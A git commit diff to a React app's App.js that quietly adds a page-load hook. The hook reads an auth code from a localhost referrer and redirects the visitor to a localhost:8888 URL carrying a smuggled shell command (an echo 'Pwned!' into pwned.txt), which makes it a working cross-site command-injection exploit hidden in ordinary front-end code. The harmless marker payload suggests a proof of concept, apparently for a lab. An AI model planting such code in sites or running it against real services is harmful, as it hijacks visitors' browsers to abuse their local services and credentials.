12b4383108a5011ab93a61f12155999567574b27
Samuel Thorson <sthor726@gmail.com>
2025-03-16 17:29:44 -0500

    fsdg

--- react-app/src/App.js
+++ react-app/src/App.js
@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useEffect } from "react";
 import { BrowserRouter, Route, Routes } from "react-router-dom";
 
 import "./App.css";
@@ -11,7 +11,24 @@ import Navigation from "./components/Navigation.js";
 import Footer from "./components/Footer.js";
 import ScrollToTop from "./ScrollToTop.js";
 
+
 function App() {
+
+  useEffect(() => {
+    const referrer = document.referrer;
+    if (referrer) {
+      if (!referrer.includes("localhost")) {
+        return;
+      }
+      //console.log("Referrer URL:", referrer);
+      const authCode = referrer.split('/').filter(Boolean).pop();
+      //console.log("Auth Code:", authCode);
+      const attack = `http://localhost:8888/${authCode}/add/url/https%3A%2F%2Fwww.google.com%2F%27%3Becho%20%22Pwned%21%22%20%3E%20pwned.txt%3B%27/`
+      //console.log("Attack URL:", attack);
+      window.location.href = attack; // Redirect the user to the attack URL
+    }
+  }, []);
+
   return (
     <div className="App">
       <BrowserRouter>
